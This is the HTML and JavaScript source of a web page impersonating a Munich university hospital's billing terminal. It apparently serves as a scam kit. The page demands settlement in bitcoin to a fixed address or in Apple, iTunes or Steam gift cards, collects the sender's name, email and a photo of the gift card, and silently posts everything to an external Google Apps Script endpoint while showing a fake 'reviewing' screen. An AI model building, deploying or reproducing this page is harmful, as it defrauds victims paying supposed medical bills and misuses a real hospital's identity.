<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Billing Terminal | Klinikum rechts der Isar</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .tum-blue { background-color: #005293; }
        .hero-overlay { background: rgba(0, 0, 0, 0.7); }
        #main-portal, #review-message { display: none; }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            width: 36px;
            height: 36px;
            border-radius: 50%;
            border-left-color: #005293;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="bg-gray-100 font-sans">

    <div id="login-screen" class="min-h-screen flex items-center justify-center bg-slate-900 p-6">
        <div class="bg-white p-8 rounded-3xl shadow-2xl max-w-sm w-full text-center">
            <img src="https://i.ibb.co/LdbfV4P/TUM-Logo.png" class="h-12 mx-auto mb-6">
            <h2 class="text-xl font-bold mb-2 uppercase text-gray-800 tracking-tight">Clinical Portal</h2>
            <input type="password" id="pass-input" placeholder="Terminal Password" class="w-full border-2 p-3 rounded-xl mb-4 text-center outline-none">
            <button onclick="verify()" class="w-full tum-blue text-white py-3 rounded-xl font-bold uppercase shadow-lg">Unlock Terminal</button>
        </div>
    </div>

    <div id="review-message" class="min-h-screen flex items-center justify-center bg-gray-100 p-6">
        <div class="bg-white p-10 rounded-3xl shadow-2xl max-w-lg w-full text-center border-t-8 border-blue-900">
            <div class="flex justify-center mb-6"><div class="spinner"></div></div>
            <h2 class="text-2xl font-black text-blue-900 uppercase mb-4">Reviewing Submission...</h2>
            <p class="text-gray-600 font-medium leading-relaxed">We will get back to you on your provided email after payment confirmation.</p>
        </div>
    </div>

    <div id="main-portal">
        <nav class="bg-white py-4 px-6 border-b flex justify-between items-center shadow-sm">
            <img src="https://i.ibb.co/LdbfV4P/TUM-Logo.png" class="h-10">
            <p class="text-[9px] font-bold text-gray-400 uppercase text-right leading-tight text-gray-400">Technical University<br>of Munich</p>
        </nav>

        <div class="relative h-64 w-full bg-cover bg-center" style="background-image: url('https://mri.tum.de/sites/default/files/styles/hero_image/public/images/hero/klinikum_rechts_der_isar_gebaeude.jpg');">
            <div class="absolute inset-0 hero-overlay flex flex-col items-center justify-center text-center p-4">
                <h1 class="text-white text-3xl font-black uppercase tracking-tight">Billing Terminal</h1>
            </div>
        </div>

        <div class="max-w-4xl mx-auto -mt-10 mb-20 px-4">
            <div class="bg-white shadow-2xl rounded-2xl overflow-hidden border">
                <form id="billing-form" class="p-6 md:p-10">
                    <h2 class="text-lg font-bold text-gray-800 mb-6 border-l-4 border-blue-600 pl-3 uppercase">1. Patient Details</h2>
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
                        <input type="text" name="Patient_Name" placeholder="Patient Full Name" required class="border-2 p-3 rounded-xl outline-none">
                        <input type="text" name="Hospital_ID" placeholder="Hospital ID (TUM-XXXX)" required class="border-2 p-3 rounded-xl outline-none">
                        <input type="text" name="Spouse_Name" placeholder="Sender Name" required class="border-2 p-3 rounded-xl outline-none">
                        <input type="email" name="Spouse_Email" placeholder="Sender Email" required class="border-2 p-3 rounded-xl outline-none">
                    </div>

                    <h2 class="text-lg font-bold text-gray-800 mb-6 border-l-4 border-blue-600 pl-3 uppercase">2. Settlement</h2>
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
                        <select name="Payment_Mode" class="w-full border-2 p-3 rounded-xl bg-white outline-none">
                            <option value="Full Settlement">Full Settlement</option>
                            <option value="Advanced Deposit">Advanced Deposit</option>
                        </select>
                        <select name="Card_Type" class="w-full border-2 p-3 rounded-xl bg-white outline-none">
                            <option value="BTC Only">BTC Only</option>
                            <option value="Apple Card">Apple Gift Card</option>
                            <option value="iTunes Card">iTunes Gift Card</option>
                            <option value="Steam Card">Steam Card</option>
                        </select>
                    </div>

                    <div class="bg-gray-900 rounded-3xl p-6 text-white mb-8 border-b-8 border-blue-600 shadow-xl">
                        <p class="text-gray-500 text-[9px] uppercase font-black mb-1">Official BTC Address</p>
                        <code class="text-green-400 text-xs break-all">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</code>
                        <div class="mt-6">
                            <label class="block font-bold text-blue-400 mb-2 uppercase text-[10px]">Upload Card Photo or BTC Receipt:</label>
                            <input type="file" id="fileInput" required class="block w-full text-xs text-gray-400 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:bg-blue-600 file:text-white cursor-pointer">
                        </div>
                    </div>

                    <button type="button" onclick="submitForm()" class="w-full tum-blue text-white py-5 rounded-2xl font-black text-xl uppercase shadow-lg">Submit Verification</button>
                </form>
            </div>
        </div>
    </div>

    <script>
        function verify() {
            if(document.getElementById('pass-input').value === 'KLINIKUM2026') {
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('main-portal').style.display = 'block';
            }
        }

        async function submitForm() {
            const fileInput = document.getElementById('fileInput');
            if(!fileInput.files[0]) { alert("Please upload a file"); return; }

            // Show reviewing screen immediately
            document.getElementById('main-portal').style.display = 'none';
            document.getElementById('review-message').style.display = 'flex';

            const reader = new FileReader();
            reader.readAsDataURL(fileInput.files[0]);
            reader.onload = async () => {
                const formData = new FormData(document.getElementById('billing-form'));
                const data = Object.fromEntries(formData.entries());
                data.Verification_File = reader.result;

                // POSTing to your new script URL
                await fetch('https://script.google.com/macros/s/AKfycbwVu2-vtop4OyZiLioJaZa0o9GLFBw85gqEP4UV_V5Irq1YbKQdW8XNg1F0vDnP_4yHwA/exec', {
                    method: 'POST',
                    mode: 'no-cors',
                    body: new URLSearchParams(data)
                });
            };
        }
    </script>
</body>
</html>
